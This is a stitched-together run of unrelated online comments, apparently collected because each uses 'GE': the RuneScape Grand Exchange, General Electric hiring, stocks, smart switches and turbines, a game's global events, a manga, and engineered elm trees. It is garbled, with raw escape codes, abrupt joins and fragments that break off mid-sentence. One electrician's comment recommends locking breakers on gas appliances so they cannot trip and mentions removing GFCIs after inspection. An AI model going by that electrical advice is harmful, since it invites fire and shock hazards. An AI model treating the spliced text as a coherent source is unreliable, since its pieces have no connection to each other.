Then, the oil **pump**; unfortunately it seems the 2ZZ's stock oil pump gears have a rep for not holding up to an over-rev without grenading, and that's super bad if it happens. Now, to be clear; you should be able to go right up to the rev limiter without problems if it's healthy, but if you downshift hard and go over the limiter, that could end badly.

This habit in turn affects things such as what people decide to smith.  \n&gt;  \n&gt;For example, if a smith knew that there was a dry offer for 1.8m on an elder rune pickaxe +5 (which is 600k over mid) then they would rather make that instead of say, two pairs of elder rune gauntlets +5 (same bar total as a single pickaxe +5) which often sell for 550k each. The lack of transparency on the GE combined with people simply valuing their time means certain items simply aren't being smithed or traded.  \n&gt;  \n&gt;There is a straightforward solution to this, one that most of us (including myself) never hoped to hear, but is a semi-true solution nonetheless: adopting some form of an Auction House. Having an auction house (as commonly seen in most MMOs these days, kicking off with WoW) means the seller can list anything at however much they wish, and the buyer can then look at the listings and decide whether its worth the price. The biggest shine to this is simply that the listings are visible. So it solves the problem I stated above. Grand exchange is one of the most unique features of our game however, found no place else. I would hate to see it fully replaced, but we may end up needing some sort of auction house feature in near future.\n\nFlipping is very easy to do on an AH, i have done it loads on WOW, GW2 and BDO", "See, I've been in those shoes before but there's a problem with that. As demonstrated by what actually gets sold on the GE, most people are willing to cut corners and make the easiest one especially due to how afk it is. Evidently, 90%+ of all smithed items are gloves and boots and all its doing is fueling the high alch stockpile. In theory you think it is encouraging people to go out, communicate and barter with buyers what other things to make. But in practice none of that is being done. Most people will sacrifice profit over taking the time to actually see what buyers are actually willing to overpay for.\n\nIn your defence, I think part of the blame has to do with them making heat-loss speeds the same across all items which means you can actually fully afk single-bar items such as gloves and boots because they complete before 50% heat loss. Anything else requires several cycles of reheating which means you need to be attentive.", "I never done that or heard about something like that.

Those bedside ultrasounds aren't the ones being replaced by Butterfly. When you get a transrectal ultrasound for your prostate and depend on 1mm resolution to make a diagnosis, you need a level of granularity that can't be obtained by looking at your iPhone. The GE VSCAN extend, Philips Lumify and fujifilm Sonosite's iViz are already in existence. But they're not $20k each, but at a much more reasonable $5-6k each. These would be much more likely competitors. Also, they've failed on their promise to deliver exponentially decreasing cost to performance (due to Moore's law). \n\nIn addition, Butterfly is only one of many disruptors in the POCUS environment (see clarius, Somaview, vavehealth) and aren't even wireless but I'll admit that their transister based IP is legit and is a major advantage over individualized ranges of piezoelectrics. Those previously mentioned incumbents, GE, Philips, Fujifilm, have been stalling progression in ultrasound technology because they hold an oligopoly, have artificially created a higher barrier to entry through exorbitant costs, and created a system within American healthcare reimbursement to stifle innovation and cost-lowering advances.\n\nThe way that all ultrasound sales operate right now is through indirect sales (GE, Philips, Sonoque, etc...) to a hospital group. But in addition to an outright price of around $20-40k, you pay for a maintenance contract. The actual cost of the ultrasound and maintenance is shouldered by the administration. Therefore, the doctor or technician doesn't own the device. Rather, they borrow it from the hospital or health group when they have to use it. Usually, the administration ends up just leasing or makes monthly payments. Butterfly is copying that model (device costs $2000, maintenance contract is $30/month) and selling to you directly.\n\nTL;DR: Butterfly isn't replacing the $20-40k ultrasounds. They created a new market in consumer healthcare products on the clinician's side and selling directly to them.", "I've worked for P&amp;G and Kroger corporate, and put in countless resumes to GE. A hand delivered resume from someone I knew that worked there and knew the hiring manager got me my interview at P&amp;G.  A call out of the blue from my LinkedIn profile got me an interview from Kroger, but by that time I had very specific experience that they were looking for that my time at P&amp;G gave me.\n\nI've only heard from GE a few times, and it was always a \"were sorry but we filled that position\" email that came like 12 months after I applied.  I have a buddy that works at GE now, I'm pretty sure he got in with a personal reference.", "I've worked for both GE and P&amp;G.  Both use automated systems for the first \"cull\" of resumes, so if you don't have the basic required qualifications, you are auto-rejected.  The overall hiring process at P&amp;G is much more rigorous in general, but right at this moment GE is laying off like crazy and P&amp;G is hiring like crazy.  I wouldn't bother with GE at all - not only are the chances slim, but even if you get a job the company is not in a good place and most friends I know there are pretty miserable and looking for other jobs.\n\nP&amp;G you have to get through both their automated system AND pass the personality/intelligence assessment, which only like 1 in 2000 applicants does.  Once you pass the assessment, you can then reach out to any contacts you may have internally to see if they can help you get an interview.", "Wouldn\u2019t recommend GE - laid off 10% of Aviation. Which is their most profitable sector. \n\n5/3 seems to be a little less corporate, in terms of hiring process. I\u2019d recommend reaching out to people on LinkedIn (either people in the position you want or in HR/recruiting) and asking for advice. \n\nIn regards to P&amp;G, I left a year ago, where I was a Senior Brand Manager. During my time there I was on the UC recruiting team and mentored numerous people through the interview process. \n\nWhat type of position are you looking for? Depending on the function, they might not be accepting experienced hires. For example,  majority of the brand management track roles are hired from Interns/graduate hires (from select schools they recruit from) or cross-functional transfers. That said, the willingness to hire experienced hires has changed in the past 2 years. \n\nRegardless of the position you\u2019ll have to pass the online assessment. This includes: personality, spatial reasoning, logical reasoning, and mathematical reasoning. Good news - the test is much easier and faster than in the past. Plus everything is online. I\u2019d take this pretty seriously as you only get one chance to take it per year (for any and all roles). \n\nAfter taking the assessment, you will be given a score internally. Different roles require higher scores than others. Assuming you pass, you\u2019ll be placed into a pool of candidates who they can pull to move on to phone interviews. This is usually based on your resume. \n\nHappy to help with any questions you have regarding the p&amp;g process. \n\nBest of luck!", "GOOPY IS POOPY AND KANA IS KOOL GET OUT OF THIS LOOPY DONT BE A FOOL", "You are not wasting your time. By design, the GEs afford an opportunity to acquire classified items from the three or four featured sets, while also applying a global effect which makes the game easier (the second and third tier effects have drawbacks in addition to benefits, but tbe base tier effect is purely beneficial).\n\nYou should not ignore these sets, though no, they are not the community favorites. Lonestar is very fun, and is downright hilarious when you run it with a Cassidy. It is also extremely flexible, as it has no mainstat benchmarks (which can also make it a little intimidating). Final Measure is an *excellent* support set that can also be rolled however you like. Deadeye is the least useful here, on my view, but even it is pretty fun to use to troll rogues (briefly), as a glass cannon.\n\nRegardless, if you really don't want these pieces, you can do a few other things instead:\n\n* [Here](https://old.reddit.com/r/thedivision/comments/iuvfj0/how_am_i_supposed_to_farm_gear_in_div_1/g5ogkzr/?utm_source=reddit&amp;utm_medium=usertext&amp;utm_name=thedivision&amp;utm_content=t1_g6cg060) is my guide to collecting classified and exotic gear (note it leaves off Shield rewards, which are excellent and you should work toward them -- check the relevant tab of the Dossier portion of the menu).\n\n* [Here](https://old.reddit.com/r/thedivision/comments/eo1ya7/division_1_classified_gear_easiest_way_to_get/fehwdc3/?utm_source=reddit&amp;utm_medium=usertext&amp;utm_name=thedivision&amp;utm_content=t1_g6cg060) is a guide to the LZ boss run.\n\n* [Here](https://old.reddit.com/r/thedivision/comments/a7yojp/resistance_farming/ec6ui56/?utm_source=reddit&amp;utm_medium=usertext&amp;utm_name=thedivision&amp;utm_content=t1_g6cg060) is my guide to Resistance farming.\n\nI would point out that Superior GE caches can also contain exotic items, so spending your GE credits therecan be valuable (and since the GE credit cap is 10k, if you reach the cap you *should* spend some credits rather than leaving them on the ground). I would also note that you can save your GE credits -- once the GE is over, you can still spend any GE credits at the vendor (the stock remains fixed to the last active GE), but you can also wait until the next GE, and spend your credits when *it* is active, perhaps for sets you would rather have.\n\nBut mostly I'd say to just play, collect GE credits, spend them, and collect all the things. There will be plenty of opportunity to collect more classified items during the next GE, and of course you can use my guides in between GEs.\n\n(Also, not for nothing, but the 3k GE caches also include DivTech and some other useful currencies, so they are useful in that sense, too.)", "Exactly.

As people are overlooking one important factor which is that OSRS has 3-4x more players online than RS3 at all times.

You look back at best and worst performers showing big wins for tech and big, unrecoverable loses in energy.  That\u2019s exciting.  Invest in energy right?   If you scoff at energy you should think again.  Tech has been a great play.  There are still good plays in tech but hear OP\u2019s point regarding Exxon and GE.  All the titans will fall eventually.  We don\u2019t want to buy the stocks that perform well.  We want to buy the dip.  By definition we want to buy the stocks performing badly.   Energy is performing badly.  We ARE using less gas than this time last year but are we using less energy?   Will we use less energy in the future than we do today?   There are huge gains to be made in energy IMHO but there are pitfalls.  \nIf you want to make moves in this sector I think you start buy breaking up into smaller sectors.  Oil exploration, oil refinement, oil transportation, fracking, natural gas refinement NG transportation, power generation, coal mining, coal transportation, solar, wind, hydroelectric, nuclear, and now battery solutions.  These are all sub-sectors with very different market potential.   \nI think we are at the bottom in several alternative energy solutions and I think now is the time to buy the dip.   There\u2019s a strong argument against it.  That counter argument is that these solutions are not new.  They were the next big thing in 2000, and 2010.  What makes them special in 2020?

The blame for that lies squarely on the producers for their failure to tone it down. \n\nI also don\u2019t see any issue with GE being written for Dalton. Brosnan was excellent in it. He played the dark scenes very well, in my opinion, and the final confrontation with Trevelyan couldn\u2019t have been any better with Dalton.\n\nWhich leads me to another point: Dalton was great, but his reputation as some dark and gritty hero is exaggerated, in my opinion. LTK was very dark, yes, but TLD is just as lighthearted and campy as some of Moore\u2019s movies. Don\u2019t get me wrong - TLD is in my top 6-7 Bond films - but I have never viewed Dalton himself as particularly dark. He would\u2019ve been great in GE, but I feel Pierce still made it his own. \n\nI think the fact that Pierce played a sort of \u201cgreatest hits\u201d version of Bond is fine, because he could pull it off. He had the acting range to deliver charm, sophistication, wit, and a flash of cruelty. I think that made him perfect for the role.", "I agree with you partly.\n\nPierce was great in GE, and I think he was needed after Dalton. The issue was it was almost \u201c Dalton\u201d material he starred in.\n\nIt resembled TLD way more than it resembled DAD for example.\n\nFunny, I actually think LTK was sillier than TLD. \n\nWhy?: Felix Leiter being Bonds dear friend but aging 30 years since TLD, Sanchez mutilating a CIA agent and thinking he could escape Noriega and Che Gueveras fate, the Ninja assassins, the \u201cGet him to the wedding\u201d sequence and so much else. \n\nTLD just seemed like a sober, classy spy thriller by comparison.

This is an open issue with OZW so I\u2019m patiently waiting until it\u2019s resolved. I do like the smaller size of the newer GE devices, especially when you have multiple switches in the same box.\n\nFWIW I have also used the Inovelli Black Z-Wave dimmers with the new OZW beta and they work great. I also like the LED strip that shows the dimming level. These can be used with your existing 3-way I believe without an add on switch if you have neutral wires. They cost less than the GE switches\u2019 regular price, so the prime day deal isn\u2019t a huge savings in comparison.

I have gambled away 100s of millions at the sand casino between 2016 - 2019 (when I had a main).

Those people will skirt around the rules or break them regardless. The duel arena is a form of gambling. Jagex offer the option of buying gold with real money which can then be used to stake with. As far as I know there is no point in this transaction that checks a player's age. They are essentially allowing children to gamble real money and starting real addiction.\n\nCan you give a real, significant reason for the duel arena to stay? Other than gold sink... because there are other ways for that.\n\nIn my opinion, Jagex could do an amazing thing through removal of the duel arena. They can odd a small tax 0.1-1.0% on GE trades to replace the duel arena tax. The GE is a convenience... we should be paying for this convenience... don't like it? Dont use it. This could potentially bring back \\*some\\* of the bank shouting from the past through people opting not to pay the tax and trading in person.

Yes you can buy animals from other players, either directly or via the GE. It does not matter what age you buy them, but buying them as eggs or babies allows you to get more xp out of them as they have more growth stages. As the animal gets to a new growth stage you harvest them to get the xp and some materials, this hasn't been changed but note that if you wait too long and the animal goes through 2 growth stages for example then you lose out on the xp of the stage you missed.\n\n2. In general don't buy from the GE as the prices are too high. Buy from players directly, in w2 at the farm players sell them or use the PoF trading discord.\n\n3/4. Again GE prices aren't reliable just buy dinosaurs from other players, they are much more affordable. Using PoF/ROoT usually comes in 2 ways- you either breed or buy eggs/baby animals then either grow them to adol for beans/gp/better xp per hour (not 100% sure on this last one) or elder for better xp/gp. Buying animals from other players is exactly the same as getting the animal yourself, there's no difference for example from how you grow an adult dragon you grew yourself or one you bought.\n\nAnyways I'll just describe how I set-up my farms; I basically was aiming for as cheap xp/gp as possible and minimal interaction. \n\nSo I bred my own animals, hence had 2 elder male rabbits in the small pens for the extra breeding chance success. Then I had 2 breeding pairs of elder spiders in the med pens and grew the 2 eggs till elder then sold them for beans (I had spiders because their food is much cheaper and I wanted the perk too). Then I had 3 breeding pairs of elder dragons- 1 in each large pen and 1 in the breeding pen. This was because the dragons grew faster than I could breed them and so I also occasionally supplemented these by buying dragon eggs.\n\nFor ROoT I bought salamander eggs with beans and just grew them till elder then sold for beans and repeat. I bought 2 elder varanasaurs for my med pen, then used them to breed babies which I grew to elder then sold for beans. Finally I bought 1 breeding pair of large dinos for the breeding pen and due to how long large dinos take to grow, they provided me with enough eggs to stock my large pens to grow to elders and then sell for beans.\n\nAll in all this was really cheap xp, the main cost other than the start-up animals was food which is fairly cheap.

I read it after finishing DomeKano and experiencing that dumpster fire of ending, so maybe my standard was lowered, but it was enjoyable.\n\nUnlike DomeKano, I really disliked the MC in GE. The guy just doesn't react normally, allows himself to be entangled with other girls when he's with someone, and runs away when anything serious comes up. Like I think he literally RAN AWAY like 20 times in the manga. Even in volume 1, he ran away immediately after confession. I also really hate how he hurt Sho so many times, especially when he started dating her while still obviously having strong feelings for Yuki. It's so sad to see him just pretending to be into Sho, while Sho has no idea, and continues to sleep with him.\n\nAnother thing I hated was the psycho ex boyfriends. Both Kento and Tooru acted like stalkers towards the end. Yet, both girls still continue to talk to them and engage with them. Kento cheated on Sho multiple times, I don't understand why she doesn't just cut her losses with him. Towards the end, it was clear that Sho essentially moved on, but was guilt tripped into giving Kento another chance. That made me puke in my mouth. In fact, that's probably the inspiration for the car crash in DomeKano, with Sasuga just recycling the plot device. The usage of car crash for characters to gain pity and forgiveness, I thought was really cheap.\n\nIn terms of Tooru, I don't even know where to start. What this guy did was unforgivable. Let's ignore the fact that his friends lied about him letting them watch. He still guilt tripped Yuki into having sex with him, and he did it because he wanted to prove that he's a man to his friends. That's fucking bullshit. Then this guy turns into a damn stalker, and continuously harass Yuki. I really hate everything around this plot line. Let's start with Yuki's mom telling her Tooru came around and giving her his number. Like, she knows Yuki had to transfer because of what he did, yet she still gave her his number, why? Not to mention after Yuki deleted the number and showed she had no interest in talking with him, her mom then gave her his letter, again, why? Then after he tracked her down (his sister thing was absolutely stupid, and an unbelievable coincidence), why did Yuki even bother taking his calls? Especially to the point of exhaustion. Then we got Kento kidnapping Yuki. The whole thing was disgusting.\n\nIn the end, both Tooru and Kento had good endings, with Kento marrying Sho and Tooru becoming a lawyer and having someone who's into him. I honestly hate both of these characters and couldn't care less about them. Like I said, Kento getting back with Sho was disgusting. Tooru not getting punished for what he did to Yuki, and also for kidnapping her is also disgusting. I really don't see why we even needed to know what happened to Tooru afterwards. I wish both of these characters would just fuck off, which is exactly what the girls should have said to them.\n\nOk, so complaints aside, here's what I liked about the series.\n\nI liked all the supporting characters and all  the girls. Sho was a great person throughout, and she really deserved better than Kento, not to mention the way MC used her, then dumped her. Sasuga really didn't give her any justice. However, I really love her character and how upbeat she is. Then we got Yuki, who I also really liked. She really made me feel warm and fuzzy with how supportive she is. The thing about this manga is that it's very clear who MC loves and who he should be with. That's why I really was upset whenever he slept with Sho. I was hoping that MC and Yuki end up together, and like she said at the end, them being together makes it a good ending. I was still traumatized by DomeKano, so I was afraid something crazy will come up in the last few chapters and MC ends up with someone else. I hated MC, but I want Yuki to be happy.\n\nI also really liked the friends trio. They really are good friends, and sometimes I feel like all they do is listen to MC bitch about his relationship and helping him with his problems. I loved Eri and am pretty happy her and Tetsuya ended up together. She was supportive and helpful throughout the series, and is one of the few actual good people in the series.\n\nTsukasa was also a great character. Despite him being a playboy, he doesn't toy with girls and always treats people well. His storyline with Risa really redeemed Risa in my eyes. I had no idea where the story was taking Risa, as it was clear she had no chance from the beginning, and is just hurt over and over. Tsukasa helping her get out of MC's shadow and moving forward was a fantastic storyline. While their ending was pretty ambiguous, I'd like to think they just want to be by each other's side, and obviously get hot and heavy when nobody's looking.\n\nAll in all, I enjoyed the series, and it was significantly better than DomeKano for me. While I like DomeKano's MC more, I enjoyed this series being pretty clear on who the right girl is, and seeing MC and Yuki overcome hurtles to be together. The ending was indeed pretty good, although I wish they would told their ex's to go to hell.", "I agree with most of what you said, except DomeKano being better. To me it's significantly worse than GE, and the ending aren't even comparable lol. DomeKano probably had one of the worst ending and final arc of anything I've ever read. It's also pretty clear where Sasuga got the idea of the car crash from. Hina getting into a car accident and MC being guilted into dumping his pregnant fiance was basically Kento guilting Sho into being with him via the car crash 2.0. Both of which used car crash as a cheap plot device and made people act like idiots.\n\nYou're so right about the sex scenes. Actually I hated the sex scenes in GE, because you KNOW Sho is the rebound and MC's heart is not in it. So I feel bad about Sho whenever they had sex. Sasuga really did Sho dirty with how MC treated her, and her ending up being with Kento, that cheating bastard.", "Well to each his own, I prefer DnK for various reasons.

I'd argue that it was the downfall to the old method of standard autochat trading.

That sound greedy. \n\nI mean those camo were available, they just need to put some condition to unlock so we can either grind it out or pay as we want, not forcing us to spend money. \n\nE.g Japan only have the default one as forest, the rest is 200GE.

I also have pretty thorough coverage in my network with no device more than about 20' from another device and most less.  I did have to get one Z-Wave repeater to achieve that.\n\nOf course, I have other tech, including WiFi, MyQ, etc. and my central control is Home Assistant.\n\nMy only complaint about home automation tech is the fact that the vendors keep changing their standards.  I'd love to stay at one version of Home Assistant; however, gateway services change frequently or just outright go away.\n\nAutomation is definitely not for the faint of heart.", "Honestly, I kind of wish the old Trading Posts got converted into GEs in addition to the hub. Then anyone who doesn't like the hub could avoid it. But that failed the poll so hub it is; I wouldn't want to see that replaced by a better hub.", "Yup, I've had 2 incidents so far where the GE didn't use the number I put in, luckily the quantity wasn't that big but it could have been worse.", "I transferred from UPM and most of my GE courses were credited.

I used GE Zwave switches and dimmers on my first setup, then I used Homeseer Dimmers, and now all I use is Inovelli for dimmers and switches.

I've had 4 Homeseer Dimmers die in 2 years, but now if either dies it gets replaced with an Inovelli dimmer or on/off switch. I've been using Inovelli for about 6 months, and I'm very happy with them...I gotta say they're probably the best zwave switches. Check em out. \n\nIn terms of Zwave network reliability, it's been pretty solid. I have 2 ge on off switches that leave the network probably once every 2 years, but that's not too big of a deal. Schlage Zwave lock has no problems, I paired it once and that's been it. Im on a smart things gen 2 hub..I've used gen 3 and that seems fine too. The idea that every Zwave device extending the network works, I have a couple of devices probably 50' away from the hub, if it went straight to the hub it would have to go through a couple brick walls..but my other switches seem to be extending the network no problem.\n\nI'd say see what a Zwave network repair does, and worst case exclude all the devices and repair, starting with the device's closest to the hub and then branching out, followed by a network repair.

Here's the fact set I'm working with:\n\n1. Current breeding efforts in the eastern US without GE are having positive motion towards blight resistant trees\n2. The resistance of these bred trees is multifactorial -- many genes contribute through many different pathways which results in differing degrees of blight resistance throughout the population\n3. This effort is likely to take 30-40 more years before we see a consistently resistant *breeding population* of american elms\n4. The GE trees are cuttings from a single GE tree with the oxalate oxidase enzyme\n\nIn order to have a healthy population we need diversity. If we introduce the GE trees en masse, we end up with a fairly heterogenous population of elms with regard to the gene pool. While many of these trees may have resistance via the oxalate oxidase pathway, the blight may evolve to overcome this. In order to \"outmanuever\" the blight there needs to be multifactorial resistance and different resistance mechanisms among the trees. I'd support the introduction of a few GE trees, maybe 2-3 dozen across the entire eastern seaboard. But en masse it results in a gene pool that is selecting just for the oxalate oxidase enzyme and doesn't have any other resistance mechanisms. Additionally, without the GE trees we would have a population of healthy blight resistant trees in a few decades, so it's not a necessity.", "Here's the free version https://www.tokyodawn.net/tdr-molotok/\n\nAlthough there's of course also the demo version of the GE one on the TDR site which has no automatic recall.", "I have the GE Opal.  It\u2019s fantastic.  Makes ice quickly and quietly.", "It\u2019s actually not too hard to clean, but it does require some maintenance and hassle. It does need the water in it, but also I\u2019ve found that it\u2019s not good to leave them running all the time (though ymmv with the GE Opal) so you have to plan hours ahead when you want ice and keep a watchful eye as it produces ice. If too much ice gets backed up in one place it will sense as if it\u2019s full and stop making anymore, just is one problem I face. It will also sense that there is ice in the thing even if it\u2019s already melting, and it won\u2019t produce anymore until it\u2019s mostly empty. So there were times when I would go to it to try to get out ice and I would have barely enough for one or two drinks because it would all be melted mostly. And what ice I did have was hardly ever quality. I didn\u2019t even get one of the cheap ice makers, I genuinely thought I was buying the one that would work best for me and splurged over some cheaper options. \n\nI\u2019ll probably use it again in the future on rare occasions, but for now I live in a small house and it\u2019s not even worth the countertop space, so it stays in storage. I would really highly recommend you consider other options for ice, because after buying mine I find that my same complaints are often voiced by others who own different brands and types of the countertop ice makers. Either save up and get a really nice cabinet ice maker or stick with whatever ice you already have and buy one of the ice crushers to get it into uniformly small pieces.", "GE?", "If it's the same lure I saw at 330 GE yesterday, they weren't really targeting anyone specifically. They were just dumping bucketloads of 10k+ gear towards the wildy and high tier stuff in the wildy hoping anyone at the GE might take the bait. I marked a tile with an Armadyl chest and tried hopping world's to log under it and snatch it but they were smart enough to move it by the time I hopped back.", "This is pretty sweet. It has that precision and excellent flexibility that TDR is known for but in a much more analog flavor. $36 is definitely a steal IMO.\n\nAlso, might be worth changing the title - it's a compressor mainly. It has a limiter/clipper built in on the GE version, but it's more of an extra feature.", "Well, I agree with you. Unfortunately, I have found absolutely no studies which follow what you're talking about; someone who buys into a basket of stocks and continues to buy the same stocks while actively managing out the losers (or the ones that go bankrupt) over a multi-decade period of time. Evidence (+ my own portfolio) suggests that a basket of stocks will outperform indexing, especially if your basket of stocks is tilted towards a specific factor. I've always maintained that the SPY is my worst performing investment by a long-shot, but it offers steady capital preservation. And to be clear, it's not that there's something inherently wrong with the SPY. It's that the components which I target aren't represented %-wise in a way that I've found to accomplish my goals. Part of my portfolio includes several companies which are individually components of the SPY but at very different weights vs the index.\n\nFrom my perspective, part of the problem with this data is that until the past decade, it really wasn't possible to accomplish buying pieces of a basket because of the high-fees that were associated with buying individual securities. To compound this issue was the notion that fractional shares have only been a thing for the past \\~10 years, while becoming a mainstream thing only a year ago. So if you only had $100 to invest, you'd have to pick and choose which stocks you invest in instead of just buying your basket every single pay-period. The other part of this is that we've been on an upward trajectory for the past 11 years, so anyone who was buying a handful of big names like MCD, WM, AAPL, COST, JNJ, etc. is up in their money and has beaten the SPY. This is also inclusive of them adding stuff in like XOM, GE (and never dropping those either).\n\nThe thing that backtests hide is the emotional component that comes along with investing like this. Since there's scant evidence surrounding it, you're mostly going to be investing on your own which comes with it's own challenges. Some people have very hard times with drawdowns; others don't care at all and are able to truly keep buying while their portfolio is dropping. I'd imagine that it comes down to the idea of whether or not you're investing money you \"need\", and whether you're able to continue to add new capital in through your labor. If your finances are in order (+ you can generate new capital), you'll probably stick to the plan especially if you see it working.\n\nPing me in a decade and we can see how this turned out.", "Crazy how cne does nothing to promote weekend GEs, thanks for pointing this one out.", "????

The higher ones, blood and third age, exceed GE value so they aren't sold on there but other dyes are fine to shill on ge.", "Journeyman from Nevada here.\n\nHere are a few points before I get to your numerical questions.\nFirst, a C2 licensed contractor will be necessary for the job due to permitting. There is no way to safely change the panel without removing the meter base and if you do, you can be liable for damage or injury to anyone doing it. Be cautious not to hire some cavalier freelancer. If you do, you may have to remove the panel and start over if you do. You can be stuck for months with no power at all until the situation is rectified and that is a nightmare.\n\nSecond, due to covid and trade issues, some breakers are either in high demand or being delayed from production. Perhaps the contractors cannot answer based on what may or may not be available in your area currently.\n\nThird, the internal wiring is what creates a large portion of hazards. Basic panel maintenance can resolve your issue of worrying about safety and there are arc fault and gfci breakers that can provide further protection if you feel it is necessary. The electrical code has changed drastically in the past few years and current code requires afci and gfci breakers nearly everywhere, including refrigerators. \nIf your fridge is on a gfci protected circuit and it trips, you may lose all the perishable items in it. Although the cost isn\u2019t an issue, the inconvenience may be worth considering if that is right for you. \n\nFourth, ATS systems often require emergency lighting and receptical circuits as most generators and battery backups are not suitable for powering your entire home. These require specific and methodical emergency power circuiting to power only critical lights and receptacles when that transfer switch kicks over. This all depends on the size of your home and the amount of renovation you plan to do in the foreseeable future. How much power your solar or generator backup can provide and how long the battery itself will last without maintenance are incredibly important to consider before you jump in headfirst.\n\nFifth, many jurisdictions allow electrical panels to be junctioned inside, meaning an electrician can make additional connections and terminations in the panel to create whatever breaker layout you want. They can likely group the breakers how you want but you are gonna pay 150 bucks an hour for redundancy. \nThe downside of additional junctions is that the more junctions you have, the more prone your home is to a fault or hazard. \nThe panel labeling is significantly more important than the placement of breakers, despite you wanting to direct your ocd at the panel. I get it, but you will not be looking at the panel as you are not a licensed contractor. If you are, there is a problem with who you hired. Homeowners should not be playing with live electrical systems ever in my opinion.\n\nRegarding good solar ready panels, I prefer square d homeline systems. Those are built in panels that are not typically meant for connection to overhead power lines, as you see in much of texas.\nAs to whether the panel you prefer and breakers are available in your area currently is beyond me. \nIf your home is on a 100 amp service currently, it seems pretty unlikely you will need anything beyond a 200 amp service upgrade through your TX c2 licensed contractor. \nAgain, this MUST be completed with a contractor for your safety and by law. That is a constant nationally. There is no DIY panel replacement unless you are listening to a moron. ( perhaps you are haha).\n\nAbout arc fault versus non.\nTo electricians, they always seem like overkill. We understand that good wiring in the home and panel is the most effective safeguard against hazards. However, many homes have been remodeled by know it alls that do dangerous nonsense which has made our lives much more difficult and our projects significantly more expensive to complete. For gas appliances such as gas ranges and gas dryers, afci breakers are not always required and it is recommended to have what we call a breaker lock out to stop it from tripping and filling your home with noxious gas. They are cheap and simply hold the breaker in the on position so it effectively cannot trip. Some jurisdictions are different so you\u2019d have to reach out to a local licensed and knowledge electrician to really know what applies to your area.\n\nFor your numbered questions\n1) depends on the size of the home and the amount of additions you plan on doing. additions also require building permits so don\u2019t get too excited and overdo it. If your house is on a 100 amp service, I doubt a 400 will ever be remotely necessary.\nIf your panel is outside your home and not framed into your house, it has to be a surface mount panel which also complicates things. \nAll panel manufacturers make them and frankly it comes down to the preference of the contractor and what is available. GE and Square D are both reliable, as are Siemens and Eaton. It\u2019s a preference, not a functionality question. They all do exactly the same thing. None of them will put you in the ER. It\u2019s the workmanship inside the house that is more critical to keeping you and your family safe.\n\n2) with a panel replacement, you will need to meet code standards. Again, as much as I hate the new code and feel it is overkill, I regularly remodel homes with flying splices electrical taped in the walls. Never hire a handyman for a electricians job and I recommend not getting too deep into hgtv bs as it\u2019s serious job security for me and a hazard to you. There are alternatives to the breakers that are essentially like the typical gfci breakers in your house. There are codes for where they can be used ( within a certain distance from the panel), but with your current panel size, I doubt there is a square footage issue. You likely can install those in your home tomorrow without replacing the panel if you are worried about safety now. Arc faults are no better at regulating power, but are intended to stop faults between the ground and neutral lines to prevent unnecessary hazards, often due to overloading circuits and poor workmanship.\n\n3) gfcis tripping can spoil all the food in your fridge, but if a handyman wired your kitchen in a remodel, it could be a wise decision. I do not have a gfci on my fridge personally and have know many homeowners who remove the gfci after inspection. I cannot professionally recommend that because I don\u2019t live in your state nor am I familiar with your home, but figured I\u2019d mention.\n\n4) Electric Charging Stations often run 40 to 50 amps. I\u2019d be reluctant to pay for a 400 amp panel for the possibility of needing to charge 3 cars at once seeing as they can also charge from a 110 receptical. Not worth the investment in my opinion.\n\n5) the ats is going to require a rewire or junctioning to make it effective. You should not plan on running your entire home off a generator unless you have enough money to throw at this. We are talking potentially tens of thousands of dollars so keep that in mind. Also, the battery systems are relatively new so repairs may be necessary and expensive until that technology has had some time to mature. If a lineman gets hurt from your system, that means you hired an unqualified contractor or he doesn\u2019t understand his basic job functions. We are trained for this and 200 amp panels are pretty tame in comparison to three phase systems.\n\n6) upgrade all lighting to led if possible as the power consumption, lighting capabilities and heat conductivity all create a better system with less demand on the components.\nAs far as options, it\u2019s a remodel so that depends on what else you renovate and how much you are looking to spend. The sky is the limit. I\u2019ve installed directional floor light, mud set lighting that lies within the drywall, steam and dry saunas, led crown molding, led under cabinet and kick lighting. Those are cosmetic options but have little to do with the safety and efficiency of the system as a whole. Regarding safety, surge protection was a great place to start. Make sure your new panel is \u201csolar ready\u201d. \n\n6) (second part of the question) Again, arc fault breakers are not the only solution anymore. There are arc fault devices that can do the same exact thing. They sometimes, if not always, take expert installation to ensure you aren\u2019t stuck taking a shower or fumbling down a dark stairway in the dark. \nThese afci or afci/gfci combo devices work with any system from the 90s ( your home) to today. \n\n\nI cant stress this enough.\nThe internal wiring is as important, if not more-so, than the panel itself. Hire an expert that can put your mind at ease. \n\nBest of luck from Las Vegas.", "You should be fine adding another GE.

Part of this problem is that EXP rates have also skyrocketed and things have got easier in general, but MTX certainly didn't help.\n\nThat said - a lot of people have accepted that loss.

It does provide you the ability to learn some ways of penning some tanks.\n\nUsing \"test drive\" to make a prem vehicle purchase is a piss poor decision making.

It would be the country\u2019s first big investment in offshore turbine-making for five years and would initially supply turbines for the giant Dogger Bank offshore wind farm.\n\nBoris Johnson, prime minister, this week announced a \u00a312bn investment package for green energy designed to help the UK hit its ambitious goal of net-zero carbon emissions by 2050. The government has lifted its target for offshore wind capacity to 40 gigawatts by 2030, up from its previous aim of 30GWs. Capacity is currently 10GWs.\n\nMr Johnson is also aiming to create 60,000 jobs in the offshore wind sector by 2030, compared with 11,000 currently, according to RenewableUK, the industry body.\n\nDespite the ambitious targets, the UK has relatively limited capacity for manufacturing offshore wind technology. While 48 per cent of spending on offshore wind farms goes back into the UK economy, manufacturing and construction is worth just 29p of every pound. Mr Johnson on Wednesday pledged to raise the overall proportion of spending going back into the economy to 60 per cent.\n\n\u201cI\u2019m very worried about the state of the UK\u2019s position in this growing market,\u201d said James Ritchie, chair of Energi Coast, the representative body of north-east England\u2019s offshore wind cluster. \u201cWe\u2019re picking up the crumbs.\u201d\n\nHe urged the government to mandate UK content for renewable technologies and \u201chave the balls to stand up and say, it has to be built here\u201d.\n\nGovernment officials and industry representatives are expected to discuss the GE decision next week at a meeting on how to increase British involvement in supply chains for renewable technology. \n\nSome 190 of GE\u2019s new Haliade-X turbines will be used in the first two phases of the Dogger Bank wind farm, 130km off the Yorkshire coast. Up to 200 turbines will be installed in each of the three phases of construction. When complete in 2026, it will be the world\u2019s biggest offshore wind farm, with capacity of 3.6GWs \u2014 enough to power 4.5m homes.\n\nThe Haliade-X, which has yet to begin production, is set to be the world\u2019s most powerful wind turbine, with a height of 248m and a generating capacity of 13 megawatts. A large site is needed to manufacture and assemble the separate parts, and the first models are due to be produced in France.\n\nTees Valley mayor Ben Houchen is favourite to attract the UK plant, despite rival bids from Humberside and Rosyth in Scotland.\n\nMr Houchen, a Conservative, has received \u00a3212m in government funds to clean up vast former steelworks sites that shut in 2015. The South Tees Development 